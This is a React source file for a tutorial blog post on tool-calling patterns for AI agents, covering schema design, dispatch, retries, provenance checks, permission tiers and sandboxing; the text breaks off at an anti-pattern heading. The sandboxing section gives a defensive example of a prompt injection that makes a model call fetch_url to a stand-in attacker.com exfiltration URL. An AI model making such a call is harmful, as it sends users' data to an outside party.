import { useState } from 'react';
import { Link } from 'react-router-dom';
import Decision, { Pill } from '../../components/Decision';
import Insight from '../../components/Insight';
import CodeBlock from '../../components/CodeBlock';
import FadeIn from '../../components/FadeIn';

const TOOL_SCHEMA_CODE = `const tools = [
  {
    name: 'search_orders',
    description: 'Search customer orders by status, date range, or customer ID. Returns max 20 results.',
    parameters: {
      type: 'object',
      properties: {
        customer_id: { type: 'string', description: 'Customer UUID' },
        status: {
          type: 'string',
          enum: ['pending', 'shipped', 'delivered', 'cancelled'],
          description: 'Filter by order status',
        },
        date_from: { type: 'string', format: 'date', description: 'ISO date, e.g. 2024-01-15' },
        date_to: { type: 'string', format: 'date', description: 'End of date range (inclusive)' },
      },
      required: [],  // All optional — model can search with whatever it has
    },
  },
  {
    name: 'cancel_order',
    description: 'Cancel a pending order. Only works if status is "pending". Returns the updated order.',
    parameters: {
      type: 'object',
      properties: {
        order_id: { type: 'string', description: 'Order UUID to cancel' },
        reason: {
          type: 'string',
          enum: ['customer_request', 'fraud', 'out_of_stock', 'other'],
          description: 'Reason for cancellation — drives downstream analytics',
        },
      },
      required: ['order_id', 'reason'],  // Cannot cancel without both
    },
  },
];`;

const TOOL_SCHEMA_OUTPUT = `Tool count: 2 | Total schema tokens: ~180

Keep tool count low. Accuracy degrades as you add more tools —
models start confusing similar tools or ignoring some entirely.
Sweet spot: 8-15 tools per agent. Beyond 20, test heavily.`;

const DISPATCH_CODE = `async function dispatchTool(toolCall, context) {
  const { name, arguments: args } = toolCall;
  const tool = toolRegistry[name];

  if (!tool) {
    return { error: \`Unknown tool: \${name}\`, status: 'invalid' };
  }

  // Validate arguments against JSON Schema
  const validation = validateArgs(args, tool.schema);
  if (!validation.valid) {
    return { error: validation.errors.join('; '), status: 'invalid' };
  }

  // Check permission tier before execution
  if (tool.tier === 'confirm' && !context.userConfirmed) {
    return {
      status: 'needs_confirmation',
      preview: await tool.dryRun(args, context),
    };
  }

  // Execute with timeout — no tool runs forever
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), tool.timeoutMs || 10000);

  try {
    const startTime = Date.now();
    const result = await tool.execute(args, {
      ...context,
      signal: controller.signal,
    });
    const duration = Date.now() - startTime;

    // Structured audit log — every tool call, no exceptions
    log.tool({ name, args, result, duration, status: 'success',
               userId: context.userId, conversationId: context.conversationId });

    return { result, status: 'success', duration };
  } catch (err) {
    log.tool({ name, args, error: err.message, status: 'error' });
    return { error: err.message, status: 'error' };
  } finally {
    clearTimeout(timeout);
  }
}`;

const DISPATCH_OUTPUT = `> dispatchTool({ name: 'search_orders', arguments: { status: 'pending' } })

{ result: [{ id: "ord_123", status: "pending", total: 89.99 }],
  status: "success",
  duration: 127 }

> dispatchTool({ name: 'delete_database', arguments: {} })

{ error: "Unknown tool: delete_database", status: "invalid" }

> dispatchTool({ name: 'cancel_order', arguments: { order_id: 'ord_456' } })

{ error: "Missing required: reason", status: "invalid" }

Dispatch overhead: ~2ms | Validation: ~0.5ms | The tool itself is the bottleneck.`;

const RESILIENT_CODE = `class ResilientToolExecutor {
  constructor() {
    this.failureCounts = new Map();
    this.circuitBreakers = new Map();
  }

  async execute(toolCall, context) {
    const { name } = toolCall;

    // Circuit breaker — tool is temporarily disabled after repeated failures
    if (this.circuitBreakers.get(name)) {
      return { error: \`\${name} temporarily unavailable\`, status: 'circuit_open' };
    }

    for (let attempt = 1; attempt <= 3; attempt++) {
      const result = await dispatchTool(toolCall, context);

      if (result.status === 'success') {
        this.failureCounts.set(name, 0);  // Reset on success
        return result;
      }

      // Don't retry input errors — the model sent bad args, tell it
      if (result.status === 'invalid') return result;

      // Exponential backoff: 200ms, 400ms
      if (attempt < 3) {
        await sleep(Math.pow(2, attempt) * 100);
      }
    }

    // Trip circuit breaker after 3 consecutive failures of this tool
    const failures = (this.failureCounts.get(name) || 0) + 1;
    this.failureCounts.set(name, failures);

    if (failures >= 3) {
      this.circuitBreakers.set(name, true);
      // Auto-reset after 60s — maybe the downstream recovered
      setTimeout(() => this.circuitBreakers.delete(name), 60000);
    }

    return { error: \`\${name} failed after 3 retries\`, status: 'exhausted' };
  }
}`;

const RESILIENT_OUTPUT = `> executor.execute({ name: 'search_orders', arguments: { status: 'pending' } })

Attempt 1: timeout after 10s
Attempt 2: success (retry recovered a transient failure)
{ result: [...], status: "success", duration: 3200 }

> // After 3 consecutive failures of the same tool:
Circuit breaker OPEN for search_orders — cooling off for 60s
{ error: "search_orders temporarily unavailable", status: "circuit_open" }

Recovery rate with retries: ~80% | Without retries: ~45%
Median time to circuit-break: 35s | Auto-heal: 60s`;

const PROVENANCE_CODE = `class ArgumentProvenanceTracker {
  constructor() {
    this.knownIds = new Map();  // id -> { source, toolCall, timestamp }
  }

  // Record IDs that come back from tool results
  recordResult(toolCall, result) {
    const ids = extractIds(result);  // Recursively find all ID-like fields
    for (const { field, value } of ids) {
      this.knownIds.set(value, {
        source: toolCall.name,
        field,
        timestamp: Date.now(),
      });
    }
  }

  // Validate that IDs in tool arguments came from a previous tool result
  validateProvenance(toolCall) {
    const argIds = extractIds(toolCall.arguments);
    const violations = [];

    for (const { field, value } of argIds) {
      if (!this.knownIds.has(value)) {
        violations.push({
          field,
          value,
          issue: 'ID not found in any previous tool result — possible hallucination',
        });
      }
    }

    return {
      valid: violations.length === 0,
      violations,
      // Allow override for user-provided IDs (they typed it in chat)
    };
  }
}

// Usage in the dispatch pipeline:
const provenance = new ArgumentProvenanceTracker();

async function safeDispatch(toolCall, context) {
  const check = provenance.validateProvenance(toolCall);
  if (!check.valid && !context.userProvidedIds?.includes(check.violations[0]?.value)) {
    return {
      error: \`Hallucinated ID detected: \${check.violations[0].field}=\${check.violations[0].value}\`,
      status: 'provenance_violation',
    };
  }

  const result = await dispatchTool(toolCall, context);
  if (result.status === 'success') {
    provenance.recordResult(toolCall, result.result);
  }
  return result;
}`;

const PROVENANCE_OUTPUT = `> // Model searches orders first — IDs recorded
safeDispatch({ name: 'search_orders', arguments: { status: 'pending' } })
Recorded IDs: ord_123, ord_456, ord_789

> // Model tries to cancel with a real ID — passes
safeDispatch({ name: 'cancel_order', arguments: { order_id: 'ord_123', reason: 'customer_request' } })
Provenance check: PASS (ord_123 from search_orders)
{ status: "success" }

> // Model hallucinates an ID — caught
safeDispatch({ name: 'cancel_order', arguments: { order_id: 'ord_999', reason: 'fraud' } })
Provenance check: FAIL
{ error: "Hallucinated ID detected: order_id=ord_999", status: "provenance_violation" }

Hallucination catch rate: ~95% | False positive rate: <2% (user-provided IDs)`;

const TABS = ['Schema Design', 'Tool Dispatch', 'Error Recovery', 'Permissions & Sandboxing', 'Anti-patterns'];

export default function ToolUseFunctionCalling() {
  const [tab, setTab] = useState(0);

  return (
    <div className="page-content">
      <Link to="/blog" style={styles.back}>&larr; AI Engineering</Link>
      <p style={styles.eyebrow}>Post 10</p>
      <h1 style={styles.h1}>Tool Use &amp; Function Calling Patterns</h1>
      <p style={styles.subtitle}>
        The engineering of reliable tool dispatch — schema design, validation, retry logic,
        permission models, and sandboxing. Every agent that touches the real world runs through this layer.
      </p>

      <div style={styles.tabWrap}>
        {TABS.map((t, i) => (
          <button key={t} onClick={() => setTab(i)} style={{ ...styles.tabBtn, ...(tab === i ? styles.tabActive : {}) }}>{t}</button>
        ))}
      </div>

      {tab === 0 && <SchemaDesignPanel />}
      {tab === 1 && <ToolDispatchPanel />}
      {tab === 2 && <ErrorRecoveryPanel />}
      {tab === 3 && <PermissionsPanel />}
      {tab === 4 && <AntiPatternsPanel />}

      <FadeIn><div style={{ marginTop: 48, padding: '24px 28px', background: 'var(--bg-card)', border: '1px solid var(--border)', borderRadius: 'var(--radius-md)' }}>
        <p style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--text-accent)', letterSpacing: '0.08em', textTransform: 'uppercase', marginBottom: 8 }}>Hands-On Project</p>
        <p style={{ fontSize: 15, fontWeight: 600, color: 'var(--text-h)', marginBottom: 6 }}>SQL Analytics Agent with Permission Tiers</p>
        <p style={{ fontSize: 13, color: 'var(--text-muted)', marginBottom: 12 }}>Build the real thing. Production-grade project brief with architecture requirements, evaluation criteria, and deep dive exercises.</p>
        <a href="https://github.com/gmaheshraju/Hands-on-AgenticAI/blob/main/projects/10-tool-use.md" target="_blank" rel="noopener noreferrer" style={{ fontSize: 13, color: 'var(--text-accent)', textDecoration: 'none', fontWeight: 500 }}>View project brief on GitHub →</a>
      </div></FadeIn>
    </div>
  );
}

function SectionHead({ title, desc }) {
  return (
    <>
      <h2 style={styles.sh}>{title}</h2>
      <p style={styles.ss}>{desc}</p>
    </>
  );
}

/* ─── Tab 1: Schema Design ─── */
function SchemaDesignPanel() {
  return (
    <div>
      <SectionHead
        title="Tool schema design"
        desc="The foundation — how you define what tools can do determines whether the model calls them correctly 95% of the time or 60% of the time."
      />

      <FadeIn><Decision question="JSON Schema vs custom DSL vs TypeScript types for tool definitions?">
        <Pill type="green">JSON Schema</Pill> Industry standard. OpenAI, Anthropic, Google all use it for tool definitions. Runtime-validatable with ajv (4KB minified). Interoperable across providers — same schema works everywhere.
        <br /><br />
        <Pill type="red">Custom DSL</Pill> Creates lock-in. Every new engineer learns your format. Every provider switch requires a translation layer. The 2 weeks you save designing it, you spend 2 months maintaining it.
        <br /><br />
        <Pill type="amber">TypeScript types</Pill> Great for DX — you get autocomplete and compile-time checks. But the LLM API needs JSON Schema at runtime. Bridge with zod-to-json-schema: define once in Zod, export to JSON Schema for the API. Adds a build step but worth it for teams over 3 engineers.
      </Decision></FadeIn>

      <FadeIn delay={100}><Decision question="How granular should tool definitions be?">
        <Pill type="green">Fine-grained: one function per action</Pill> search_users, get_user_by_id, update_user_email. The model picks the right tool 95% of the time because the name IS the intent. More tokens in the system prompt (~50 tokens per tool), but token cost is negligible vs. error cost.
        <br /><br />
        <Pill type="red">Coarse-grained: one function, multiple actions</Pill> user_management(action, params). Fewer tools to choose from, but the model has to reason about the action parameter PLUS the params structure. Error rates jump to 30%+ because the model confuses action types or passes wrong params for the action.
        <br /><br />
        <Pill type="green">Sweet spot: 8-15 tools per agent</Pill> Below 8, you are probably combining too many concerns. Above 15, accuracy degrades noticeably — models confuse similar tools and pick wrong ones more often. At 40+ tools, models tend to ignore tools entirely and hallucinate answers instead. Test your specific tool set; the degradation depends heavily on how distinct your tool names and descriptions are.
      </Decision></FadeIn>

      <FadeIn delay={200}><CodeBlock filename="tool-schema.js" code={TOOL_SCHEMA_CODE} output={TOOL_SCHEMA_OUTPUT} /></FadeIn>

      <FadeIn delay={300}><Insight>
        The description field is more important than the schema itself. The model reads descriptions to decide WHEN to call a tool, not just HOW. A tool with a perfect schema but a vague description will be called at the wrong time. Write descriptions like you are explaining to a junior engineer: what it does, when to use it, what it returns, and what it does NOT do. "Search customer orders" is bad. "Search customer orders by status, date range, or customer ID. Returns max 20 results. Does NOT return order items — use get_order_details for that." is good.
      </Insight></FadeIn>

      <FadeIn delay={400}><Decision question="Required vs optional parameters — where to draw the line?">
        <Pill type="green">Required = tool literally cannot execute without it</Pill> order_id for cancel_order: required. The function would throw without it. date_from for search: optional. The function defaults to last 30 days.
        <br /><br />
        <Pill type="amber">Every required param the model has to fill is a failure point</Pill> If the model does not have the customer_id, it should be able to search by status or date instead. Making customer_id required forces the model to either ask the user (slow) or hallucinate one (dangerous).
        <br /><br />
        <strong>Rule of thumb:</strong> if you can write a sensible default in the function body, make the parameter optional. Required parameters should fail loudly and obviously when missing — "cannot cancel without an order ID" makes sense; "cannot search without a customer ID" does not.
      </Decision></FadeIn>

      <FadeIn delay={500}><Insight tag="Production number">
        In production systems processing 10K+ tool calls/day, the #1 cause of tool call failures is not schema mismatch — it is description ambiguity. Two tools with overlapping descriptions (e.g., "get user info" vs "fetch user profile") cause the model to pick randomly. Rename one to make intent crystal clear. Rewriting vague descriptions into specific, unambiguous ones is often the single highest-ROI fix for tool call accuracy.
      </Insight></FadeIn>
    </div>
  );
}

/* ─── Tab 2: Tool Dispatch ─── */
function ToolDispatchPanel() {
  return (
    <div>
      <SectionHead
        title="Tool dispatch architecture"
        desc="The runtime layer that actually executes tool calls. This is where latency, reliability, and observability live."
      />

      <FadeIn><Decision question="Direct execution vs message queue vs workflow engine?">
        <Pill type="green">Direct execution</Pill> Tool call {'->'} function {'->'} result {'->'} back to model. Simple, fast, good for read-only tools. Latency: 50-500ms depending on the downstream API. Use for 90% of tools.
        <br /><br />
        <Pill type="amber">Message queue (SQS, Redis streams, Bull)</Pill> Tool call {'->'} queue {'->'} worker {'->'} result {'->'} callback. For side-effect tools: send email, create ticket, charge payment. Gives you retry with backoff, audit trail, dead letter queue, and idempotency. Adds 200-800ms latency but you get reliability guarantees.
        <br /><br />
        <Pill type="red">Workflow engine (Temporal, Step Functions)</Pill> For multi-step tools that need compensation logic. "Book flight + hotel" — if hotel booking fails, automatically cancel the flight. Temporal adds ~2s overhead per step. Overkill for 90% of use cases, essential for the other 10% (financial transactions, multi-system orchestration).
      </Decision></FadeIn>

      <FadeIn delay={100}><Decision question="Parallel vs sequential tool calls?">
        <Pill type="green">Parallel for reads</Pill> Model requests multiple tools in one turn: "Get weather AND search flights." 2-5x faster end-to-end. But tools cannot depend on each other's results. OpenAI and Anthropic both support parallel tool calls natively.
        <br /><br />
        <Pill type="amber">Sequential for writes</Pill> One tool per turn. Slower but the model reasons about previous results before the next call. Default to this for anything with side effects — you do not want "cancel order" and "refund order" running in parallel.
        <br /><br />
        <Pill type="green">Hybrid: auto-classify by tool metadata</Pill> Tag each tool with {`{ sideEffects: false }`} or {`{ sideEffects: true }`}. Allow parallel execution only for side-effect-free tools. Force sequential for writes. Best of both worlds, and the classification is explicit in the tool registry.
      </Decision></FadeIn>

      <FadeIn delay={200}><CodeBlock filename="tool-dispatcher.js" code={DISPATCH_CODE} output={DISPATCH_OUTPUT} /></FadeIn>

      <FadeIn delay={300}><Insight>
        Always return structured errors to the model, not exceptions or stack traces. The model can reason about "Order not found — try searching by customer email instead" and self-correct 70-80% of the time. It cannot reason about "TypeError: Cannot read property 'id' of undefined at line 47." Return {`{ error: "human-readable message", status: "error" }`} — the model reads this like a colleague's Slack message and adjusts its approach.
      </Insight></FadeIn>

      <FadeIn delay={400}><Insight tag="Latency budget">
        In a conversational agent, the user waits for the full loop: model inference (1-3s) + tool execution (50ms-10s) + model inference again (1-3s). Your tool execution is the only part you fully control. Budget 500ms for simple reads, 2s for API calls, 5s max for anything synchronous. Beyond 5s, make it async: return a job_id, let the model tell the user "processing, I will check back," and poll. Users abandon after 15s of silence.
      </Insight></FadeIn>

      <FadeIn delay={500}><Insight tag="2026 shift: code-mode tool calling">
        The classic loop — one JSON tool call, one model round-trip, repeat — is starting to lose ground to <strong>programmatic tool calling</strong>. Instead of emitting {`{ name, arguments }`} for each step, the model writes a short program (JS/Python in a sandbox) that calls tools as ordinary functions, loops, filters, and composes results before returning. A 6-tool workflow that used to cost 6 inference round-trips collapses into one code block that runs to completion. Anthropic's "code execution with MCP" and Cloudflare's "Code Mode" both push this pattern in 2025-2026, and the wins are real: fewer round-trips (lower latency and token cost), intermediate results that never re-enter the context window (a 50-row query gets filtered to 3 rows <em>in the sandbox</em> instead of being pasted back into the prompt), and native control flow the JSON protocol could never express. The catch: you are now running model-authored code, so the sandbox <em>is</em> the security boundary — no network by default, CPU and memory caps, and the same provenance checks you would apply to any tool argument. In interviews, framing tool use as "the model orchestrates in code, the runtime enforces the sandbox" signals you have tracked where the field moved past hand-rolled dispatch loops.
      </Insight></FadeIn>
    </div>
  );
}

/* ─── Tab 3: Error Recovery ─── */
function ErrorRecoveryPanel() {
  return (
    <div>
      <SectionHead
        title="Error recovery patterns"
        desc="Tools fail. APIs time out. Rate limits hit. Graceful recovery under these conditions is what keeps agents running in production."
      />

      <FadeIn><Decision question="Retry strategy — what to retry and what to surface?">
        <Pill type="green">Transient errors: retry with exponential backoff</Pill> Timeout, rate limit (429), server error (503). Max 3 retries with 200ms/400ms/800ms backoff. 80% of tool failures are transient — a single retry recovers most of them.
        <br /><br />
        <Pill type="red">Input errors: never retry</Pill> Invalid arguments, missing required fields, malformed data. Retrying with the same bad input is a waste of compute. Return the error to the model immediately — it will fix its arguments and try again with correct input.
        <br /><br />
        <Pill type="amber">Business logic errors: surface to model</Pill> "Order already cancelled," "insufficient funds," "user not found." These are not failures — they are information. The model needs to tell the user what happened, not retry the same operation.
      </Decision></FadeIn>

      <FadeIn delay={100}><Decision question="What if the model keeps calling the wrong tool?">
        <Pill type="green">Circuit breaker pattern</Pill> If the same tool fails 3 times consecutively in one conversation, temporarily remove it from the available tools list for 60 seconds. The model is forced to try a different approach. Auto-resets after the cooldown.
        <br /><br />
        <Pill type="amber">Fallback tools</Pill> search_orders fails? Fall back to list_recent_orders (simpler query, more reliable). Degraded but functional. Register fallback chains in the tool registry: {`{ fallback: "list_recent_orders" }`}.
        <br /><br />
        <Pill type="green">Escape hatch after N total failures</Pill> After 5 total tool failures in one conversation (any tool), force the model to respond with what it already knows. "I am having trouble looking up your order. Based on what you told me, here is what I can suggest..." Better than an infinite retry loop.
      </Decision></FadeIn>

      <FadeIn delay={200}><CodeBlock filename="resilient-executor.js" code={RESILIENT_CODE} output={RESILIENT_OUTPUT} /></FadeIn>

      <FadeIn delay={300}><Decision question="Partial failures in parallel tool calls?">
        <Pill type="green">Return results for successful tools, errors for failed ones</Pill> Do not fail the entire batch because one tool timed out. If the model asked for weather AND flights, and flights API timed out, return the weather data. The model has enough to give a partial answer: "The weather in Tokyo is 22C. I could not look up flights right now — try again in a moment."
        <br /><br />
        <strong>Implementation:</strong> Use Promise.allSettled, not Promise.all. Map each settled result to your structured response format. The model handles partial data gracefully — it was trained on conversations where information is incomplete.
      </Decision></FadeIn>

      <FadeIn delay={400}><Insight type="warn">
        The most dangerous failure mode is not tool errors — it is tool HALLUCINATION. The model invents a tool call that does not exist, or passes arguments that look valid but are completely fabricated (a customer_id it never retrieved from any tool result). Validate that every ID the model passes actually came from a previous tool result in this conversation. This is called argument provenance tracking — and it catches 95% of hallucinated-ID bugs before they hit your database.
      </Insight></FadeIn>

      <FadeIn delay={500}><CodeBlock filename="provenance-tracker.js" code={PROVENANCE_CODE} output={PROVENANCE_OUTPUT} /></FadeIn>
    </div>
  );
}

/* ─── Tab 4: Permissions & Sandboxing ─── */
function PermissionsDiagram() {
  const f = 'var(--font-body)';
  const fm = 'var(--font-mono)';

  return (
    <div style={{ overflowX: 'auto', margin: '20px 0' }}>
      <svg viewBox="0 0 760 280" xmlns="http://www.w3.org/2000/svg" style={{ width: '100%', display: 'block' }}>
        <defs>
          <marker id="tfa" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
            <path d="M0 0 L8 3 L0 6 Z" fill="var(--text-muted)" opacity="0.7" />
          </marker>
          <marker id="tfaA" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
            <path d="M0 0 L8 3 L0 6 Z" fill="var(--text-accent)" opacity="0.8" />
          </marker>
        </defs>

        <text x="380" y="22" textAnchor="middle" fontSize="14" fontWeight="400" fill="var(--text-h)" fontFamily="var(--font-display)">Tool Permission Flow</text>

        {/* Top row: User Request -> Agent -> Tool Selection */}
        <rect x="10" y="50" width="110" height="44" rx="8" fill="var(--text-accent)" opacity="0.08" stroke="var(--text-accent)" strokeWidth="1.5" />
        <text x="65" y="70" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>User Request</text>
        <text x="65" y="84" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>natural language</text>

        <line x1="122" y1="72" x2="158" y2="72" stroke="var(--text-accent)" strokeWidth="1.5" markerEnd="url(#tfaA)" />

        <rect x="160" y="50" width="100" height="44" rx="8" fill="var(--bg-code)" stroke="var(--border-strong)" strokeWidth="1.2" />
        <text x="210" y="70" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Agent</text>
        <text x="210" y="84" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>LLM reasoning</text>

        <line x1="262" y1="72" x2="298" y2="72" stroke="var(--text-muted)" strokeWidth="1.2" markerEnd="url(#tfa)" />

        <rect x="300" y="50" width="120" height="44" rx="8" fill="var(--bg-code)" stroke="var(--border-strong)" strokeWidth="1.2" />
        <text x="360" y="70" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Tool Selection</text>
        <text x="360" y="84" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>name + arguments</text>

        <line x1="422" y1="72" x2="458" y2="72" stroke="var(--text-muted)" strokeWidth="1.2" markerEnd="url(#tfa)" />

        <rect x="460" y="50" width="130" height="44" rx="8" fill="#E7157B" opacity="0.08" stroke="#E7157B" strokeWidth="1.5" />
        <text x="525" y="70" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Permission Check</text>
        <text x="525" y="84" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>tier lookup</text>

        {/* Three branches from Permission Check */}
        <line x1="490" y1="96" x2="130" y2="145" stroke="#3F8624" strokeWidth="1.2" markerEnd="url(#tfa)" />
        <line x1="525" y1="96" x2="380" y2="145" stroke="#ED7100" strokeWidth="1.2" markerEnd="url(#tfa)" />
        <line x1="560" y1="96" x2="620" y2="145" stroke="#E7157B" strokeWidth="1.2" markerEnd="url(#tfa)" />

        {/* Tier 1: Auto-execute */}
        <rect x="40" y="148" width="180" height="52" rx="8" fill="#3F8624" opacity="0.08" stroke="#3F8624" strokeWidth="1.2" />
        <rect x="46" y="154" width="14" height="14" rx="3" fill="#3F8624" opacity="0.9" />
        <text x="130" y="172" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Tier 1: Auto-execute</text>
        <text x="130" y="188" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>search, get, list (90% of calls)</text>

        {/* Tier 2: User Confirm */}
        <rect x="280" y="148" width="190" height="52" rx="8" fill="#ED7100" opacity="0.08" stroke="#ED7100" strokeWidth="1.2" />
        <rect x="286" y="154" width="14" height="14" rx="3" fill="#ED7100" opacity="0.9" />
        <text x="375" y="172" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Tier 2: User Confirm</text>
        <text x="375" y="188" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>update, create (show preview first)</text>

        {/* Tier 3: Manual Approval */}
        <rect x="530" y="148" width="190" height="52" rx="8" fill="#E7157B" opacity="0.08" stroke="#E7157B" strokeWidth="1.2" />
        <rect x="536" y="154" width="14" height="14" rx="3" fill="#E7157B" opacity="0.9" />
        <text x="625" y="172" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Tier 3: Manual Approval</text>
        <text x="625" y="188" textAnchor="middle" fontSize="8" fill="var(--text-muted)" fontFamily={fm}>delete, pay, send (explicit yes)</text>

        {/* All three converge to Execute then Audit Log */}
        <line x1="130" y1="202" x2="340" y2="230" stroke="var(--text-muted)" strokeWidth="0.8" strokeDasharray="3 3" />
        <line x1="375" y1="202" x2="380" y2="230" stroke="var(--text-muted)" strokeWidth="0.8" strokeDasharray="3 3" />
        <line x1="625" y1="202" x2="420" y2="230" stroke="var(--text-muted)" strokeWidth="0.8" strokeDasharray="3 3" />

        <rect x="310" y="232" width="100" height="36" rx="8" fill="var(--bg-code)" stroke="var(--border-strong)" strokeWidth="1.2" />
        <text x="360" y="254" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Execute</text>

        <line x1="412" y1="250" x2="528" y2="250" stroke="var(--text-muted)" strokeWidth="1.2" markerEnd="url(#tfa)" />

        <rect x="530" y="232" width="110" height="36" rx="8" fill="#C925D1" opacity="0.08" stroke="#C925D1" strokeWidth="1.2" />
        <text x="585" y="254" textAnchor="middle" fontSize="10" fontWeight="600" fill="var(--text-h)" fontFamily={f}>Audit Log</text>
      </svg>
    </div>
  );
}

function PermissionsPanel() {
  return (
    <div>
      <SectionHead
        title="Permissions &amp; sandboxing"
        desc="When agents touch the real world, security becomes existential. A prompt injection that triggers a write tool is a data breach."
      />

      <PermissionsDiagram />

      <FadeIn><Decision question="How to tier tool permissions?">
        <Pill type="green">Tier 1 — auto-approve (read-only)</Pill> search, get, list. No confirmation needed. 90% of tool calls in a typical agent. Zero risk — the worst case is returning stale data. Latency: tool execution time only.
        <br /><br />
        <Pill type="amber">Tier 2 — confirm (limited writes)</Pill> update_profile, add_to_cart, create_draft. Show the user what will change before executing: "I will update your email to new@example.com. Proceed?" Adds one round-trip to the user but prevents wrong-target mutations.
        <br /><br />
        <Pill type="red">Tier 3 — manual (destructive/financial)</Pill> delete_account, process_payment, send_email_to_customer. Always require explicit user confirmation. Never auto-execute, even if the model is "confident." A confident model with a hallucinated order_id is a lawsuit.
        <br /><br />
        <strong>Never tier:</strong> tools that modify permissions, access controls, or security settings. The agent must never escalate its own privileges. This is the #1 rule in agent security — an agent that can grant itself more tools is an agent that prompt injection can fully compromise.
      </Decision></FadeIn>

      <FadeIn delay={100}><Decision question="How to sandbox tool execution?">
        <Pill type="green">Process isolation</Pill> Run each tool in a separate process or container. If a tool crashes, it does not crash the agent. Adds 50-100ms latency. Use Node worker_threads for lightweight isolation, Docker containers for untrusted code execution.
        <br /><br />
        <Pill type="green">Resource limits</Pill> Cap CPU time (5s), memory (256MB), network calls (10 per execution). Prevents runaway tools — a malformed regex in a search tool should not OOM your server. In Node: worker_threads with resourceLimits. In containers: --memory=256m --cpus=0.5.
        <br /><br />
        <Pill type="green">Network allowlist</Pill> Tools can only call whitelisted domains. A prompt injection that makes the model call fetch_url("https://attacker.com/exfil?data=...") is blocked at the network layer, not the application layer. Defense in depth.
        <br /><br />
        <Pill type="green">Audit logging</Pill> Every tool call: name, arguments, result, who triggered it, conversation ID, timestamp. Non-negotiable for compliance (SOC2, GDPR audit trail). Store immutably — append-only log, not a mutable database table.
      </Decision></FadeIn>

      <FadeIn delay={200}><Decision question="Rate limiting tool calls per conversation?">
        <Pill type="green">Per-tool limits</Pill> Max 10 calls to search_orders per conversation. Prevents infinite search loops where the model keeps refining queries without converging. Most tools need at most 3 calls per conversation — set limits at 3x the expected maximum.
        <br /><br />
        <Pill type="amber">Total budget per conversation</Pill> Max 30 tool calls total. After that, force the agent to respond with what it has. An agent that has made 30 tool calls without answering the user is stuck in a loop, not being thorough.
        <br /><br />
        <Pill type="amber">Cost cap</Pill> If total tool execution cost exceeds $0.50 per conversation (API calls, compute, third-party charges), stop and explain. This catches runaway agents before they generate a surprise bill. Track cost per tool in the registry and sum during dispatch.
      </Decision></FadeIn>

      <FadeIn delay={300}><Insight>
        In practice, the security question is a trap. If you say "we validate inputs" and stop there, you have missed the point. The real answer is defense in depth: input validation + output sanitization + permission tiers + rate limits + audit trail + human-in-the-loop for destructive actions + network allowlists + process isolation. Each layer catches what the previous one missed. A single layer gives you 90% protection. Six layers give you 99.99%. That last 9.99% is where production incidents live.
      </Insight></FadeIn>
    </div>
  );
}

/* ─── Tab 5: Anti-patterns ─── */
function AntiPatternsPanel() {
  return (
    <div>
      <SectionHead
        title="Anti-patterns"
        desc="The mistakes every team makes building tool-calling agents — and the specific fixes that work."
      />

      <FadeIn><Decision question="The God Tool anti-pattern">
        <Pill type="red">What it looks like</Pill> One tool called execute_action that takes an action_type parameter and does everything. "It is flexible!" The team ships with 1 tool instead of 12, feeling clever.
        <br /><br />
        <strong>Why it fails:</strong> The model has to reason about a massive action space inside a single tool. Error rates jump from 5% (with specific tools) to 30%+ (with a God Tool). Debugging is impossible because every failure looks the same in logs — "execute_action failed" tells you nothing. You cannot set different permission tiers per action.
        <br /><br />
        <Pill type="green">Fix</Pill> One tool per action. Yes, you will have 12 tools instead of 1. The model will be 6x more accurate. The logs will be readable. The permission model will be granular. The small increase in system prompt tokens (~600 tokens for 12 tools) costs $0.003 per request — the error reduction saves you $X in customer support tickets.
      </Decision></FadeIn>

      <FadeIn delay={100}><Decision question="The Missing Description anti-pattern">
        <Pill type="red">What it looks like</Pill> {`{ name: "process", parameters: { type: "object", properties: { data: { type: "string" } } } }`}. No description on the tool. No description on the parameter. The developer "knows what it does."
        <br /><br />
        <strong>Why it fails:</strong> The model has no idea when to call this tool or what "data" means. It will either never call it (if other tools seem relevant) or call it for everything (if nothing else matches). Parameter hallucination rate doubles without descriptions.
        <br /><br />
        <Pill type="green">Fix</Pill> Descriptions on the tool AND on every parameter. "Process a customer refund request. data: JSON string containing order_id (UUID) and refund_amount (number, in cents). Returns the refund confirmation with a refund_id for tracking." Treat descriptions as documentation for a junior engineer who has never seen your codebase.
      </Decision></FadeIn>

      <FadeIn delay={200}><Decision question="The No-Timeout anti-pattern">
        <Pill type="red">What it looks like</Pill> Tool calls that can run forever. An API call to a slow third-party endpoint. A database query on an unindexed table with 50M rows. A file processing job on a 2GB upload.
        <br /><br />
        <strong>Why it fails:</strong> The user is waiting. The agent is stuck. No error, no timeout, just silence. After 15 seconds, the user refreshes. After 30 seconds, they start a new conversation. Your server is still running that tool call in the background, consuming resources.
        <br /><br />
        <Pill type="green">Fix</Pill> 10-second timeout on every synchronous tool. Use AbortController in Node, asyncio.wait_for in Python. If the tool legitimately takes longer (report generation, file processing, bulk operations), make it async: start the job, return a job_id immediately, give the model a poll_job_status tool. The model tells the user "Processing your report — I will check back in a moment" and polls every 5 seconds.
      </Decision></FadeIn>

      <FadeIn delay={300}><Decision question="The Trust-the-Model anti-pattern">
